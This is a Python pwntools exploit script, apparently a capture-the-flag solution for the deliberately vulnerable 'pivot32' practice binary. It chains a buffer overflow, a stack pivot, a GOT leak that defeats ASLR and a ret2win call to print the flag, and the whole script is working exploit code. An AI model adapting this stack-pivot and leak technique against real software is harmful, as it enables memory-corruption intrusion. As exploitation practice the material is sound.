from pwn import *
import binascii
import warnings
warnings.filterwarnings("ignore")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-gef
break print_file
'''.format(**locals())

exe = './pivot32'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

def find_eip(payload):
    p = process(exe)
    p.sendlineafter('>', 'a')
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

eip_offset = find_eip(cyclic(100))

elf_puts_plt = elf.plt.puts
elf_fh_plt = elf.plt.foothold_function
elf_fh_got = elf.got.foothold_function
xchg_eax_esp = elf.symbols.usefulGadgets + 0x2
pop_eax = elf.symbols.usefulGadgets

io = start()
io.recvuntil("Call ret2win() from libpivot")
pivot_addr = io.recvline_contains(b"The Old Gods kindly bestow upon you a place to pivot:").strip().rsplit(b' ', 1)[1]
pivot_addr = u32(unhex(pivot_addr[2:]), endian='big')

payload_1 = flat(
elf_fh_plt,
elf_puts_plt,
elf.symbols.main,
elf_fh_got
)

payload_2 = flat(
asm('nop') * eip_offset,
pop_eax,
pivot_addr,
xchg_eax_esp
)

io.sendline(payload_1)
io.sendlineafter('> ', payload_2)
io.recvlines(5)
leaked_address = io.recvlines(1)[0]

foothold_leak = unpack(leaked_address[:4].strip())
library_base = foothold_leak - 0x77d
ret2win = library_base + 0x974

payload_3 = flat(
asm('nop') * eip_offset,
ret2win
)

io.sendline(payload_3)

# io.interactive()

io.recvlines(10)
flag = io.recvline(1)
success(flag)


